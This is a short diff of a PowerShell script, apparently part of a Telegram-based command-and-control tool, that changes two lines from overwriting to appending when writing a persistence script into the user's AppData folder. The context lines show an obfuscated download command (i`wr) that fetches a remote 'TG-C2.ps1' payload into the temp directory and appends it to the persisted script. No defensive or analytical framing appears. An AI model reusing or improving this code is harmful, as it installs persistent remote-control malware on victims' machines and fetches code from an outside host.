@@ -231,7 +231,7 @@ $scriptContent | Out-File -FilePath $newScriptPath -force
 sleep 1
 if ($newScriptPath.Length -lt 100){
     "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Force
+    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
     i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
     sleep 1
     Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
@@ -427,7 +427,7 @@ $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 if ($newScriptPath.Length -lt 100){
     "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Force
+    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
     i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
     Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
     }
